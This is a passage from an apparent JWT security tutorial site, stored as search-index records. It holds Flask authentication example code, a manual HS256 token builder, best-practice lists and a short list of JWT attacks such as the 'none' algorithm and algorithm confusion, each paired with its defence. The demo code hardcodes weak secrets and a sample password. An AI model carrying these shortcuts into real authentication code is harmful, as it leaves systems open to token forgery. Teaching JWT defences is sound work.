user['sub'],\n        'role': user['role']\n    }), 200\n\n@app.route('/api/admin', methods=['GET'])\n@token_required\ndef admin_only():\n    \"\"\"Admin-only endpoint - checks role from JWT\"\"\"\n    user = request.current_user\n\n    if user['role'] != 'admin':\n        return jsonify({'error': 'Admin access required'}), 403\n\n    return jsonify({\n        'message': 'Welcome admin!',\n        'admin_data': 'sensitive information'\n    }), 200\n\n@app.route('/api/refresh', methods=['POST'])\ndef refresh():\n    \"\"\"Refresh token endpoint\"\"\"\n    data = request.get_json()\n    old_token = data.get('token')\n\n    if not old_token:\n        return jsonify({'error': 'Token is required'}), 400\n\n    # Generate new token from old one\n    new_token = jwt_manager.refresh_token(old_token, expires_in=3600)\n\n    if new_token:\n        return jsonify({\n            'message': 'Token refreshed',\n            'token': new_token,\n            'expires_in': 3600\n        }), 200\n    else:\n        return jsonify({'error': 'Invalid or expired token'}), 401\n\n# Manual JWT Creation (Understanding the internals)\nimport base64\nimport json\n\ndef manual_jwt_create(payload: Dict, secret: str) -&gt; str:\n    \"\"\"Manual JWT creation to understand the process\"\"\"\n\n    # 1. Create header\n    header = {\n        \"alg\": \"HS256\",\n        \"typ\": \"JWT\"\n    }\n\n    # 2. Encode header and payload\n    def base64url_encode(data: Dict) -&gt; str:\n        json_str = json.dumps(data, separators=(',', ':'))\n        encoded = base64.urlsafe_b64encode(json_str.encode()).decode()\n        return encoded.rstrip('=')  # Remove padding\n\n    header_encoded = base64url_encode(header)\n    payload_encoded = base64url_encode(payload)\n\n    # 3. Create signature\n    message = f\"{header_encoded}.{payload_encoded}\"\n    signature = hmac.new(\n        secret.encode(),\n        message.encode(),\n        hashlib.sha256\n    ).digest()\n    signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')\n\n    # 4. Combine all parts\n    jwt_token = f\"{header_encoded}.{payload_encoded}.{signature_encoded}\"\n\n    return jwt_token\n\n# Usage Example\nif __name__ == '__main__':\n    print(\"=\"*60)\n    print(\"JWT Authentication Example\")\n    print(\"=\"*60)\n\n    # Initialize JWT manager\n    jwt_mgr = JWTManager(secret_key='my-super-secret-key')\n\n    # 1. Generate token\n    print(\"\\n1. Generating JWT token...\")\n    token = jwt_mgr.generate_token(\n        user_id='user123',\n        username='john_doe',\n        role='admin',\n        expires_in=3600\n    )\n    print(f\"Token: {token[:50]}...\")\n\n    # 2. Verify token\n    print(\"\\n2. Verifying token...\")\n    payload = jwt_mgr.verify_token(token)\n    if payload:\n        print(f\"\u2705 Token is valid!\")\n        print(f\"User ID: {payload['sub']}\")\n        print(f\"Username: {payload['username']}\")\n        print(f\"Role: {payload['role']}\")\n        print(f\"Expires: {datetime.datetime.fromtimestamp(payload['exp'])}\")\n\n    # 3. Manual JWT creation\n    print(\"\\n3. Manual JWT creation (understanding internals)...\")\n    manual_payload = {\n        'sub': 'user123',\n        'name': 'John Doe',\n        'iat': int(datetime.datetime.utcnow().timestamp())\n    }\n    manual_token = manual_jwt_create(manual_payload, 'my-secret')\n    print(f\"Manual Token: {manual_token[:50]}...\")\n\n    # 4. Start Flask app\n    print(\"\\n4. Starting Flask API server...\")\n    print(\"Endpoints:\")\n    print(\"  POST   /api/login      - Get JWT token\")\n    print(\"  GET    /api/protected  - Access with token\")\n    print(\"  GET    /api/admin      - Admin only\")\n    print(\"  POST   /api/refresh    - Refresh token\")\n    print(\"\\nExample request:\")\n    print('  curl -X POST http://localhost:5000/api/login \\\\')\n    print('       -H \"Content-Type: application/json\" \\\\')\n    print('       -d \\'{\"username\":\"admin\",\"password\":\"password123\"}\\'')\n\n    # app.run(debug=True, port=5000)\n</code></pre>"},{"location":"security/encryption/#jwt-best-practices","title":"JWT Best Practices","text":"<pre><code>\u2705 DO:\n\u2500\u2500\u2500\u2500\u2500\u2500\n1. Use HTTPS Only\n   - Never send JWT over unencrypted connections\n\n2. Keep Tokens Short-Lived\n   - Access token: 15 minutes - 1 hour\n   - Use refresh tokens for longer sessions\n\n3. Use Strong Secret Keys\n   - Minimum 256 bits for HS256\n   - Use cryptographically random values\n\n4. Validate All Claims\n   - exp (expiration)\n   - iat (issued at)\n   - nbf (not before)\n   - aud (audience)\n   - iss (issuer)\n\n5. Use Appropriate Algorithm\n   - HS256: Symmetric (shared secret)\n   - RS256: Asymmetric (public/private key)\n\n6. Store Securely\n   - HttpOnly cookies (XSS protection)\n   - Or secure storage (not localStorage for sensitive data)\n\n\u274c DON'T:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Store Sensitive Data in Payload\n   - JWT payload is NOT encrypted, only encoded\n   - Anyone can decode and read it\n\n2. Use for Sessions with Immediate Revocation\n   - Cannot revoke JWT until expiration\n   - Use session tokens if need instant revocation\n\n3. Make Tokens Too Long-Lived\n   - Higher risk if compromised\n\n4. Use Weak Secrets\n   - \"secret\", \"password123\", etc.\n\n5. Ignore Token Validation\n   - Always verify signature\n   - Always check expiration\n\n6. Mix Authentication and Authorization Data\n   - Keep JWTs focused\n</code></pre> <p>JWT Security Considerations:</p> <pre><code>COMMON VULNERABILITIES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. None Algorithm Attack\n   \u274c {\"alg\": \"none\", \"typ\": \"JWT\"}\n   \u2705 Always validate algorithm\n\n2. Algorithm Confusion\n   \u274c Accepting both HS256 and RS256\n   \u2705 Enforce specific algorithm\n\n3. Weak Secret Keys\n   \u274c \"secret\", \"12345\"\n   \u2705 Use strong, random keys (256+ bits)\n\n4. No Expiration Validation\n   \u274c Ignoring 'exp' claim\n   \u2705 Always check expiration\n\n5. Token Leakage\n   \u274c Logging tokens, storing in localStorage\n   \u2705 Use HttpOnly cookies, secure storage\n\n6. Replay Attacks\n   \u274c No unique identifier per token\n   \u2705 Use 'jti' (JWT ID) claim\n</code></pre>"},{"location":"security/firewall/","title":"Application Firewall","text":""},{"location":"security/firewall/#youtube","title":"Youtube","text":"<ul> <li>Web Application Firewall - Complete Guide</li> </ul>"},{"location":"security/jwt/","title":"JWT (JSON Web Token)","text":""},{"location":"security/jwt/#youtube","title":"Youtube","text":"<ul> <li>JWT Explained | JWT vs SessionID | JSON Web Token | Security Challenges with JWT &amp; its Handling</li> </ul>"},{"location":"security/jwt/#theory","title":"Theory","text":""},{"location":"security/jwt/#what-is-jwt-json-web-token","title":"What is JWT (JSON Web Token)?","text":"<p>JWT is a compact, URL-safe token format for securely transmitting information between parties as a JSON object. It's digitally signed (and optionally encrypted) to verify authenticity and integrity.</p> <p>Key Characteristics: - Self-contained: Contains all necessary user information (no database lookup needed) - Stateless: Server doesn't need to store session data - Compact: Small size, easy to pass in HTTP headers/URLs - Signed: Cryptographically verified for authenticity - Standardized: RFC 7519 specification</p> <p>Common Use Cases: - Authentication (login sessions) - Single Sign-On (SSO) - API authorization - Information exchange - Mobile app authentication</p>"},{"location":"security/jwt/#jwt-structure","title":"JWT Structure","text":"<p>A JWT consists of three parts separated by dots (<code>.</code>):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                         JWT Structure                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                 \u2502\n\u2502  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.                        \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                         \u2502\n\u2502         HEADER (Base64URL)                                      \u2502\n\u2502                                                                 \u2502\n\u2502  eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0Ijo \u2502\n\u2502  xNTE2MjM5MDIyfQ.                                              \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502         PAYLOAD (Base64URL)                                     \u2502\n\u2502                                                                 \u2502\n\u2502  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                   \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                   \u2502\n\u2502         SIGNATURE (Base64URL)                                   \u2502\n\u2502                                                                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nFormat: HEADER.PAYLOAD.SIGNATURE\n</code></pre>"},{"location":"security/jwt/#complete-example","title":"Complete Example","text":"<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nWhen decoded:\n\nHEADER:\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n\nPAYLOAD:\n{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"iat\": 1516239022\n}\n\nSIGNATURE:\nHMACSHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n</code></pre>"},{"location":"security/jwt/#part-1-header","title":"Part 1: Header","text":"<p>The header typically consists of two parts: 1. Token type (<code>typ</code>): \"JWT\" 2. Signing algorithm (<code>alg</code>): HS256, RS256, etc.</p>"},{"location":"security/jwt/#common-header-properties","title":"Common Header Properties","text":"<pre><code>{\n  \"alg\": \"HS256\",        // Algorithm (REQUIRED)\n  \"typ\": \"JWT\",          // Type (OPTIONAL but recommended)\n  \"kid\": \"key-id-123\",   // Key ID (for key rotation)\n  \"cty\": \"JWT\",          // Content type (for nested JWTs)\n  \"jku\": \"https://...\",  // JWK Set URL\n  \"x5u\": \"https://...\",  // X.509 URL\n  \"x5c\": [\"cert1\"],      // X.509 certificate chain\n  \"x5t\": \"thumb...\",     // X.509 thumbprint (SHA-1)\n  \"x5t#S256\": \"...\"      // X.509 thumbprint (SHA-256)\n}\n</code></pre>"},{"location":"security/jwt/#common-algorithms","title":"Common Algorithms","text":"Algorithm Type Description Key Length HS256 HMAC SHA-256 symmetric signing 256 bits HS384 HMAC SHA-384 symmetric signing 384 bits HS512 HMAC SHA-512 symmetric signing 512 bits RS256 RSA SHA-256 asymmetric signing 2048+ bits RS384 RSA SHA-384 asymmetric signing 2048+ bits RS512 RSA SHA-512 asymmetric signing 2048+ bits ES256 ECDSA SHA-256 with P-256 curve 256 bits ES384 ECDSA SHA-384 with P-384 curve 384 bits ES512 ECDSA SHA-512 with P-521 curve 521 bits PS256 RSA-PSS SHA-256 with MGF1 2048+ bits none None \u26a0\ufe0f Unsecured (NOT recommended) N/A"},{"location":"security/jwt/#part-2-payload-claims","title":"Part 2: Payload (Claims)","text":"<p>The payload contains claims - statements about an entity (typically the user) and additional metadata.</p>"},{"location":"security/jwt/#types-of-claims","title":"Types of Claims","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                      Claim Types                            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                              \u2502\n\u2502  1. REGISTERED CLAIMS (Reserved, standardized)              \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500               \u2502\n\u2502     \u2022 iss (Issuer)                                          \u2502\n\u2502     \u2022 sub (Subject)                                         \u2502\n\u2502     \u2022 aud (Audience)                                        \u2502\n\u2502     \u2022 exp (Expiration Time)                                 \u2502\n\u2502     \u2022 nbf (Not Before)                                      \u2502\n\u2502     \u2022 iat (Issued At)                                       \u2502\n\u2502     \u2022 jti (JWT ID)                                          \u2502\n\u2502                                                              \u2502\n\u2502  2. PUBLIC CLAIMS (Collision-resistant, should be in IANA)  \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500               \u2502\n\u2502     \u2022 name, email, phone, address, etc.                     \u2502\n\u2502     \u2022 Should use URIs to avoid collision                    \u2502\n\u2502                                                              \u2502\n\u2502  3. PRIVATE CLAIMS (Custom, application-specific)           \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500               \u2502\n\u2502     \u2022 user_id, role, permissions                            \u2502\n\u2502     \u2022 organization_id, tenant_id                            \u2502\n\u2502     \u2022 Any custom data                                       \u2502\n\u2502                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#registered-claims-detailed","title":"Registered Claims (Detailed)","text":"<pre><code>{\n  // Issuer: Who created and signed the token\n  \"iss\": \"https://auth.example.com\",\n\n  // Subject: Whom the token refers to (usually user ID)\n  \"sub\": \"user123\",\n\n  // Audience: Who the token is intended for\n  \"aud\": [\"https://api.example.com\", \"https://app.example.com\"],\n\n  // Expiration Time: When token expires (Unix timestamp)\n  \"exp\": 1735689600,  // 2025-01-01 00:00:00 UTC\n\n  // Not Before: Token not valid before this time\n  \"nbf\": 1735603200,  // 2024-12-31 00:00:00 UTC\n\n  // Issued At: When token was created\n  \"iat\": 1735603200,  // 2024-12-31 00:00:00 UTC\n\n  // JWT ID: Unique identifier for this token\n  \"jti\": \"550e8400-e29b-41d4-a716-446655440000\"\n}\n</code></pre>"},{"location":"security/jwt/#complete-payload-example","title":"Complete Payload Example","text":"<pre><code>{\n  // Registered claims\n  \"iss\": \"https://auth.myapp.com\",\n  \"sub\": \"user_12345\",\n  \"aud\": \"https://api.myapp.com\",\n  \"exp\": 1735689600,\n  \"iat\": 1735603200,\n  \"jti\": \"abc-123-xyz\",\n\n  // Public claims\n  \"name\": \"John Doe\",\n  \"email\": \"john@example.com\",\n  \"email_verified\": true,\n  \"phone_number\": \"+1234567890\",\n  \"picture\": \"https://example.com/photo.jpg\",\n\n  // Private claims\n  \"user_id\": 12345,\n  \"role\": \"admin\",\n  \"permissions\": [\"read\", \"write\", \"delete\"],\n  \"organization_id\": \"org_789\",\n  \"department\": \"Engineering\",\n  \"subscription_tier\": \"premium\"\n}\n</code></pre>"},{"location":"security/jwt/#claim-validation-rules","title":"Claim Validation Rules","text":"<pre><code>def validate_claims(payload, config):\n    \"\"\"Validate JWT claims\"\"\"\n    now = int(time.time())\n\n    # 1. Expiration Time (exp)\n    if 'exp' in payload:\n        if payload['exp'] &lt; now:\n            raise ValueError(\"Token has expired\")\n\n    # 2. Not Before (nbf)\n    if 'nbf' in payload:\n        if payload['nbf'] &gt; now:\n            raise ValueError(\"Token not yet valid\")\n\n    # 3. Issuer (iss)\n    if 'iss' in payload:\n        if payload['iss'] not in config['allowed_issuers']:\n            raise ValueError(\"Invalid issuer\")\n\n    # 4. Audience (aud)\n    if 'aud' in payload:\n        audiences = payload['aud'] if isinstance(payload['aud'], list) else [payload['aud']]\n        if config['expected_audience'] not in audiences:\n            raise ValueError(\"Invalid audience\")\n\n    # 5. Issued At (iat) - check if too old\n    if 'iat' in payload:\n        max_age = config.get('max_token_age', 86400)  # 24 hours\n        if (now - payload['iat']) &gt; max_age:\n            raise ValueError(\"Token too old\")\n\n    return True\n</code></pre>"},{"location":"security/jwt/#part-3-signature","title":"Part 3: Signature","text":"<p>The signature ensures the token hasn't been tampered with. It's created by encoding the header and payload, then signing with a secret or private key.</p>"},{"location":"security/jwt/#signature-creation-process","title":"Signature Creation Process","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             Signature Creation (HS256)                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                              \u2502\n\u2502  Step 1: Encode Header                                      \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                     \u2502\n\u2502  Header JSON \u2192 Base64URL Encode                             \u2502\n\u2502  {\"alg\":\"HS256\",\"typ\":\"JWT\"}                                \u2502\n\u2502           \u2193                                                  \u2502\n\u2502  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9                       \u2502\n\u2502                                                              \u2502\n\u2502  Step 2: Encode Payload                                     \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                    \u2502\n\u2502  Payload JSON \u2192 Base64URL Encode                            \u2502\n\u2502  {\"sub\":\"123\",\"name\":\"John\"}                                \u2502\n\u2502           \u2193                                                  \u2502\n\u2502  eyJzdWIiOiIxMjMiLCJuYW1lIjoiSm9obiJ9                       \u2502\n\u2502                                                              \u2502\n\u2502  Step 3: Create Signature Input                             \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                             \u2502\n\u2502  encodedHeader + \".\" + encodedPayload                       \u2502\n\u2502           \u2193                                                  \u2502\n\u2502  eyJhbGci...J9.eyJzdWIi...obiJ9                             \u2502\n\u2502                                                              \u2502\n\u2502  Step 4: Sign with Secret                                   \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                  \u2502\n\u2502  HMAC-SHA256(signatureInput, secret)                        \u2502\n\u2502           \u2193                                                  \u2502\n\u2502  Raw signature bytes                                         \u2502\n\u2502                                                              \u2502\n\u2502  Step 5: Base64URL Encode Signature                         \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                        \u2502\n\u2502  Signature bytes \u2192 Base64URL Encode                         \u2502\n\u2502           \u2193                                                  \u2502\n\u2502  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                \u2502\n\u2502                                                              \u2502\n\u2502  Final JWT:                                                  \u2502\n\u2502  eyJhbGci...J9.eyJzdWIi...obiJ9.SflKxw...dQssw5c            \u2502\n\u2502                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#hmac-vs-rsa-signatures","title":"HMAC vs RSA Signatures","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             HMAC (Symmetric) - HS256                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                               \u2502\n\u2502  Same secret key for signing AND verifying                   \u2502\n\u2502                                                               \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      Secret Key: \"mySecret123\"            \u2502\n\u2502  \u2502   Issuer     \u2502                                            \u2502\n\u2502  \u2502 (Auth Server)\u2502      HMAC-SHA256(data, secret)            \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2193                             \u2502\n\u2502         \u2502                  Signature                          \u2502\n\u2502         \u2502 Creates JWT                                        \u2502\n\u2502         \u25bc                                                     \u2502\n\u2502  eyJhbGci...SflKxwRJ                                         \u2502\n\u2502         \u2502                                                     \u2502\n\u2502         \u2502 Sends JWT                                          \u2502\n\u2502         \u25bc                                                     \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      Secret Key: \"mySecret123\"            \u2502\n\u2502  \u2502   Verifier   \u2502                                            \u2502\n\u2502  \u2502 (API Server) \u2502      HMAC-SHA256(data, secret)            \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2193                             \u2502\n\u2502                            Verify matches                     \u2502\n\u2502                                                               \u2502\n\u2502  \u26a0\ufe0f  Problem: Both parties need the same secret!            \u2502\n\u2502      If API server is compromised, it can forge tokens       \u2502\n\u2502                                                               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             RSA (Asymmetric) - RS256                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                               \u2502\n\u2502  Private key for signing, Public key for verifying           \u2502\n\u2502                                                               \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      Private Key (kept secret)            \u2502\n\u2502  \u2502   Issuer     \u2502                                            \u2502\n\u2502  \u2502 (Auth Server)\u2502      RSA-SHA256(data, privateKey)         \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2193                             \u2502\n\u2502         \u2502                  Signature                          \u2502\n\u2502         \u2502 Creates JWT                                        \u2502\n\u2502         \u25bc                                                     \u2502\n\u2502  eyJhbGci...SflKxwRJ                                         \u2502\n\u2502         \u2502                                                     \u2502\n\u2502         \u2502 Sends JWT                                          \u2502\n\u2502         \u25bc                                                     \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      Public Key (can be shared)           \u2502\n\u2502  \u2502   Verifier   \u2502                                            \u2502\n\u2502  \u2502 (API Server) \u2502      RSA-Verify(data, signature, pubKey)  \u2502\n\u2502  